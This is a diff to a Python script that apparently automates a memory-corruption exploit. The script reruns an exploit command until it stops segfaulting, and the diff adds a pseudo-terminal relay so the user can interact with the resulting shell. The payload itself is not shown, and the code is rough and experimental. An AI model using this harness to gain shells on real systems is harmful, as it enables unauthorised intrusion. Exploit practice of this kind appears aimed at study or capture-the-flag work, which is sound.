@@ -3,6 +3,9 @@ import struct
 import os
 import re
 import sys
+import pty
+import select
+
 
 
 #this program has PIE enabled -> compilation option that changes the location of the executable in every run. PIE does not work locally
@@ -64,27 +67,99 @@ while True:
         i = 0
         while True:
             print(i)
-            exploit_proc = subprocess.Popen(exploit_command, shell=True, stderr=subprocess.PIPE)
-            # while exploit_proc.poll() is None:
-            #     print("process is running")
-            # while True:
-            #     output = exploit_proc.stdout.readline()
-            #     if output:
-            #         if b'AAAA' in output:
-            #             print(f"nopsled")
-            #             break
-            #         else:
-            #             print("in here")
-            #             print(output)
+            i += 1
 
-            exploit_proc.communicate()
+            master_fd, slave_fd = pty.openpty()
+
+            exploit_proc = subprocess.Popen(exploit_command, shell=True, stderr=slave_fd, stdin=slave_fd, stdout=slave_fd, close_fds=True)
+            print(f"Subprocess PID: {exploit_proc.pid}")
+
+            #check if vuln is blocked while expecting input (select -> non blocking)
+            _, wlist, _ = select.select([], [master_fd], [])
+
+            # if master_fd in wlist:       #must know the form of input. Is it arguments? Or stdin? Or socket? ect
+            #     print("sending the payload")
+            os.write(master_fd, b'\n')
+
+            while True:
+                status = exploit_proc.poll()
+                if status is None:
+                    print("Subprocess is still running.")
+
+                    _, wlist1, _ = select.select([], [master_fd], [])
+                    if master_fd in wlist1:
+                        print("exploit has probably succeeded??")
+
+                        rlist, _, _ = select.select([master_fd, 0], [], [])
+
+                        if master_fd in rlist:
+                            print("here1")
+                            try:
+                                output = os.read(master_fd, 1024)
+                                if output:
+                                    os.write(1, output) 
+                                else:
+                                    break 
+                            except OSError:
+                                print("e1")
+                                break     
+
+                        if 0 in rlist:
+                            print("here2")
+
+                            try:
+                                user_input = os.read(0, 1024)
+                                if user_input:
+                                    os.write(master_fd, user_input)  
+                                else:
+                                    break
+                            except OSError:
+                                print("e2")
+                                break
+                    else:
+                        print("??")
+                        continue
+                    break
+                else:
+                    print(f"Subprocess has finished with exit code {status}.")
+                break
+
+
+                # rlist, _, _ = select.select([master_fd, 0], [], [])
+
+                # if master_fd in rlist:
+                #     print("here1")
+                #     try:
+                #         output = os.read(master_fd, 1024)
+                #         if output:
+                #             os.write(1, output) 
+                #         else:
+                #             break 
+                #     except OSError:
+                #         print("e1")
+                #         break  
+
+                # if 0 in rlist:
+                #     print("here2")
+
+                #     try:
+                #         user_input = os.read(0, 1024)
+                #         if user_input:
+                #             os.write(master_fd, user_input)  
+                #         else:
+                #             break
+                #     except OSError:
+                #         print("e2")
+                #         break
             
             # Use wait() when you simply need to wait for the process to finish without interacting with its input/output streams.
+            if exploit_proc.poll() is None:
+                exploit_proc.terminate()
+                exploit_proc.wait()
 
             if(exploit_proc.returncode != 139):
                 # print(f"exploit proc return code: {exploit_proc.returncode}")
                 break
-            i += 1
 
         
         break
